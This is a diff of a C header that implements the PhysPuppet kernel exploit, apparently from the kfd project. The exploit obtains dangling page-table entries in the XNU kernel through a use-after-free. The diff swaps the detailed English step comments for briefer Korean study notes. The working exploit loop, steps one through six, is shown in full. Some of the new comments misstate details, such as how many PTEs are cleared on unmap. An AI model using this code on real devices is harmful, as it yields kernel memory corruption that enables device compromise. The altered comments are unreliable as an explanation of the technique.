@@ -5,7 +5,8 @@
 #ifndef physpuppet_h
 #define physpuppet_h
 
-const u64 physpuppet_vmne_size = pages(2) + 1;
+
+const u64 physpuppet_vmne_size = pages(2) + 1; /// vmne -> size := 2P + 1
 const u64 physpuppet_vme_offset = pages(1);
 const u64 physpuppet_vme_size = pages(2);
 
@@ -19,69 +20,61 @@ void physpuppet_init(struct kfd* kfd)
 
 void physpuppet_run(struct kfd* kfd)
 {
+    
     for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
-        /*
-         * STEP 1:
-         *
-         * Create a vm_named_entry. It will be backed by a vm_object with a
-         * vo_size of 3 pages and an initial ref_count of 1.
+    
+        //MARK: - STEP 1: Create a vm_named_entry
+        /* It will be backed by a vm_object with 
+         * a vo_size of 3 pages and an initial ref_count of 1.
          */
         mach_port_t named_entry = MACH_PORT_NULL;
         assert_mach(mach_memory_object_memory_entry_64(mach_host_self(), true, physpuppet_vmne_size, VM_PROT_DEFAULT, MEMORY_OBJECT_NULL, &named_entry));
 
+        
+        //MARK: - STEP 2: vm_named_entry를 새로운 vm_map에 매핑
         /*
-         * STEP 2:
-         *
-         * Map the vm_named_entry into our vm_map. This will create a
-         * vm_map_entry with a vme_start that is page-aligned, but a vme_end
-         * that is not (vme_end = vme_start + 1 page + 1 byte). The new
-         * vm_map_entry's vme_object is shared with the vm_named_entry, and
-         * therefore its ref_count goes up to 2. Finally, the new vm_map_entry's
-         * vme_offset is 1 page.
+         * vme_start는 vm_map_entry에서 정렬되지만,
+         * vme_end의 경우에는 vme_start + 1 page + 1byte로 정렬되지 않는다.(A + 1byte)
+         * 매핑된 vm_map_entry는 vme_object가 기존의 vm_named_entry를 공유하고 있기 때문에
+         * 총 두번의 ref_count가 발생한다.
+         * 결론적으로 새로운 vm_map_entry의 vme_offset은 하나다.
          */
         vm_address_t address = 0;
         assert_mach(vm_map(mach_task_self(), &address, (-1), 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, named_entry, physpuppet_vme_offset, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_DEFAULT));
 
+        
+        
+        //MARK: - STEP 3: vm_map_entry인 vme2에서 두 페이지가 문제 일으킴
         /*
-         * STEP 3:
-         *
-         * Fault in both pages covered by the vm_map_entry. This will populate
-         * the second and third vm_pages (by vmp_offset) of the vm_object. Most
-         * importantly, this will set the two L3 PTEs covered by that virtual
-         * address range with read and write permissions.
+         * 문제를 일으키는 두 페이지가 L3 PTE로 설정되면서 R/W 권한을 갖게 된다
          */
         memset((void*)(address), 'A', physpuppet_vme_size);
 
+        
+        //MARK: - STEP 4: virtual address 해제
         /*
-         * STEP 4:
-         *
-         * Unmap that virtual address range. Crucially, when vm_map_delete()
-         * calls pmap_remove_options(), only the first L3 PTE gets cleared. The
-         * vm_map_entry is deallocated and therefore the vm_object's ref_count
-         * goes down to 1.
+         * vm_map_delete()를 실행하게 되면,
+         * L3 PTE에 저장된 데이터가 사라진다.
+         * 따라서 vme2의 정보가 사라지게 되고
+         * ref_count 또한 1이 된다.
          */
         assert_mach(vm_deallocate(mach_task_self(), address, physpuppet_vme_size));
 
+        
+        //MARK: - STEP 5: 모든 vm_named_entry 구조체 해제
         /*
-         * STEP 5:
-         *
-         * Destroy the vm_named_entry. The vm_object's ref_count drops to 0 and
-         * therefore is reaped. This will put all of its vm_pages on the free
-         * list without calling pmap_disconnect().
+         * vmo1에서 vm_object_reap()을 발생시킴
+         * vmp1과 vmp2는 pmap_disconnect()를 호출하지 않고 자유리스트에 다시 넣음.
+         * 아직도 PTE에 데이터가 남아있음.
          */
         assert_mach(mach_port_deallocate(mach_task_self(), named_entry));
         kfd->puaf.puaf_pages_uaddr[i] = address + physpuppet_vme_offset;
 
+        //MARK: - STEP 6:댕글링 L3 PTE 획득 후..
         /*
-         * STEP 6:
-         *
-         * At this point, we have a dangling L3 PTE. However, there's a
-         * discrepancy between the vm_map and the pmap. If not fixed, it will
-         * cause a panic when the process exits. Therefore, we need to reinsert
-         * a vm_map_entry in that virtual address range. We also need to fault
-         * in the first page to populate the vm_object. Otherwise,
-         * vm_map_delete() won't call pmap_remove_options() on exit. But we
-         * don't fault in the second page to avoid overwriting our dangling PTE.
+         * 물리 주소가 없기 때문에 프로세스가 끝날때 커널 패닉 발생
+         * vm_map_entry를 다시 insert
+         * 따라서 첫번째 페이지에 대한 vm_object populate를 해야함.
          */
         assert_mach(vm_allocate(mach_task_self(), &address, physpuppet_vme_size, VM_FLAGS_FIXED));
         memset((void*)(address), 'A', physpuppet_vme_offset);
